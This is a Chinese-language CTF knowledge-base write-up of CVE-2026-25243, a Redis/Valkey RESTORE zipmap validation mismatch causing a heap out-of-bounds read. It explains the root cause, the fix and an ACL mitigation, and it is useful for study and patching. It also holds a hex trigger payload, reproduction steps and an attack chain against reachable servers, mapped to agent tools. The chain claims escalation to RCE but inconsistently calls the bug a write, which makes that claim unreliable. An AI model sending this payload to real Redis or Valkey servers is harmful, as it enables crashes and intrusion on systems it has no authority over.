---
id: "ctf-website/09-cve/02-redis-zipmap-rce"
title: "Redis/Valkey RESTORE：zipmap 长度前缀步长不一致（CVE-2026-25243）"
title_en: "Redis/Valkey RESTORE: zipmap Length Prefix Step Mismatch (CVE-2026-25243)"
summary: >
  Redis/Valkey RESTORE命令zipmap处理漏洞分析，zipmapValidateIntegrity（校验）和zipmapNext（迭代）对overlong长度前缀前进步长不一致，差4字节导致第二次迭代时堆越界读。涵盖zipmap长度编码规则、RDB type 9沿用原因、触发载荷构造、完整调用链，以及通过canonical检查拒绝overlong编码的修复原理。
summary_en: >
  Analysis of a Redis/Valkey RESTORE command zipmap processing vulnerability where zipmapValidateIntegrity (validation) and zipmapNext (iteration) disagree on overlong length prefix step size, causing a 4-byte discrepancy leading to heap out-of-bounds read on the second iteration. Covers zipmap length encoding rules, why RDB type 9 persists, trigger payload construction, full call chain, and the fix through canonical encoding checks.
board: "ctf-website"
category: "09-cve"
signals: ["Redis RCE", "Valkey", "RESTORE", "zipmap", "heap overflow", "overlong encoding", "CVE-2026-25243"]
mcp_tools: ["kb_router", "http_probe", "workspace_write_text"]
keywords: ["CVE-2026-25243", "Redis RCE", "Valkey", "RESTORE命令", "zipmap", "堆越界", "overlong编码", "heap-buffer-overflow"]
difficulty: "advanced"
tags: ["cve", "redis", "rce", "memory-corruption", "ctf"]
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# Redis/Valkey RESTORE：zipmap 长度前缀步长不一致（CVE-2026-25243）

## 1. 受影响版本

Valkey / Redis 全部版本。修复提交：Valkey `fea0b4064`（2026-05-05，PR #3619）。Redis 侧修复版本以 GHSA 公告为准。

## 2. 根因：校验与迭代对长度前缀步长理解不一致

`zipmapValidateIntegrity`（校验）和 `zipmapNext`（迭代）对同一个 overlong 长度前缀的前进步长不同：

| 阶段 | 函数 | 前缀如何前进 |
|------|------|------------|
| 校验 | `zipmapValidateIntegrity` | `s = zipmapGetEncodedLengthSize(p)` → 见 `0xFE` → 5 → 前进 5+3=8 |
| 迭代 | `zipmapNext` → `zipmapRawKeyLength` | `l=3` → `zipmapEncodeLength(NULL,3)` → 1 → 前进 1+3=4 |

**差 4 字节**。第二次 `zipmapNext` 时指针落在数据中间，把 `0x61`（`'a'`）当成长度 97 → `sdstrynewlen(fstr, 97)` 对 24 字节 buffer **堆越界读**（ASan: `heap-buffer-overflow in zipmapNext`）。

### zipmap 长度编码规则

| 首字节 | 含义 | 前缀宽度 |
|--------|------|----------|
| 0–253 | 长度即该值 | 1 字节 |
| 254 (`0xFE`) | 后跟 4 字节 uint32（小端） | 5 字节 |
| 255 | `ZIPMAP_END` | — |

### 为什么 zipmap 仍受影响

现代 Redis 写入 Hash 多为 listpack 或 hashtable，但 **RDB type 9 仍被支持**。攻击者直接构造 RESTORE payload，无需服务器上已有 zipmap key。

RDB_TYPE_HASH_ZIPMAP = 9，`rdbLoadObject` 中对应分支仍会调用 `zipmapValidateIntegrity` + `zipmapNext`。

### 修复原理

```c
// zipmapValidateIntegrity 中增加 canonical 检查
l = zipmapDecodeLength(p);
if (l < ZIPMAP_BIGLEN && s != 1)
    return 0;  // 拒绝 overlong 编码
```

含义：合法小长度必须用 1 字节（如 `0x03`），不能用 `0xFE + uint32` 的 5 字节 overlong 形式。

## 3. 触发载荷

```python
PAYLOAD = bytes.fromhex(
    "091802fe0300000061626303006465660367686903006a6b6cff"
    "50000000000000000000"
)
```

| 字节段 | 含义 |
|--------|------|
| `09` | RDB_TYPE_HASH_ZIPMAP |
| `18 02` | RDB 长度 = 0x0218 = 536 |
| `fe 03 00 00 00` | overlong 编码：5 字节表示长度 3 |
| `61 62 63` | "abc" |
| `03 00` | value len = 3 |
| `64 65 66` | "def" |
| `03 67 68 69` | field "ghi", len=3 |
| `03 00 6a 6b 6c` | value "jkl", len=3 |
| `ff` | ZIPMAP_END |
| `50 00...` | 8 字节 CRC64 |

载荷共 36 字节（不含 RDB magic），与上游 `tests/unit/dump.tcl` 中 CVE-2026-25243 用例一致。

## 4. 调用链

```
客户端发送 RESTORE key ttl <binary payload>
    ↓
restoreCommand (cluster.c)
    → verifyDumpPayload (CRC + RDB 版本校验)
    → rdbLoadObjectType (读 type 字节 = 0x09)
    → rdbLoadObject case RDB_TYPE_HASH_ZIPMAP
        → zipmapValidateIntegrity(encoded, encoded_len, 1)  // 深度校验
            → overlong 通过校验（s=5, l=3, l<254 但 s!=1 未被检查）
        → while zipmapNext 转 listpack
            → 第一次 zipmapNext: 前进 4 字节（错误，应为 8）
            → 第二次 zipmapNext: 指针落在 "abc" 中间
            → 误读 0x61('a') 为长度 97
            → sdstrynewlen(fstr, 97) → heap-buffer-overflow
```

## 5. 复现

```bash
# 1. 克隆 Valkey，切换到修复前
git clone https://github.com/valkey-io/valkey
cd valkey && git checkout fea0b4064^

# 2. ASan 构建（推荐观察 heap-buffer-overflow）
make distclean && ./configure CFLAGS="-g -O1 -fsanitize=address"
make -j$(nproc)

# 3. 启动服务（须开启 DEBUG）
./src/valkey-server --port 6379 --enable-debug-command yes

# 4. 运行 PoC
python3 exploit/exploit.py
```

### 预期 ASan 输出

```
==357339==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ba013ff9d58...
```

### 注意

`DEBUG SET-SKIP-CHECKSUM-VALIDATION` 须用 `1`/`0`，不能用 `yes`/`no`（`atoi("yes")==0`）。

## 6. 修复后行为

| 项目 | 修复前 | 修复后 |
|------|--------|--------|
| `zipmapValidateIntegrity` | overlong 通过 | 返回 0，拒绝 |
| `rdbLoadObject` | 进入 `zipmapNext` 可能越界 | 返回 NULL → `Bad data format` |
| ASan | `heap-buffer-overflow` | 无 |

## 7. 临时缓解

```bash
# ACL 禁止 RESTORE
valkey-cli ACL SETUSER <user> -RESTORE
```

## 攻击链

```
1. 探测目标 Redis/Valkey 端口可达 + 确认版本落在受影响区间
2. 确认可执行 RESTORE（未被 ACL 禁用）
3. 构造 overlong 编码的 zipmap payload（s=5, l=3, l<254 但 s!=1）
4. RESTORE key ttl <payload> 注入 → verifyDumpPayload 通过 CRC/版本校验
5. rdbLoadObject 进入 RDB_TYPE_HASH_ZIPMAP → zipmapValidateIntegrity 误判通过
6. zipmapNext 步长错配 → 指针落入数据中间 → 误读长度 → heap-buffer-overflow
7. 结合堆布局控制 → 从越界写升级为 RCE
```

## Evidence

记录: ASan 输出、Redis/Valkey 版本、`rdbLoadObject` 返回值、`zipmapValidateIntegrity` 校验结果

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 Redis / RESTORE / zipmap 信号搜索 |
| HTTP 探测 | `http_probe` | 确认 Redis 端口可达 |
| 写分析笔记 | `workspace_write_text` | 记录 ASan 输出 |

## 参考资料

| 来源 | 链接 |
|------|------|
| GHSA | https://github.com/redis/redis/security/advisories/GHSA-c8h9-259x-jff4 |
| Valkey 修复 | https://github.com/valkey-io/valkey/commit/fea0b4064cf612d1c365b032326832bff0946bd9 |
| Valkey 仓库 | https://github.com/valkey-io/valkey |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-25243%20Invalid%20Memory%20Access%20in%20Redis%20RESTORE%20Command%20May%20Lead%20to%20Remote%20Code%20Execution |
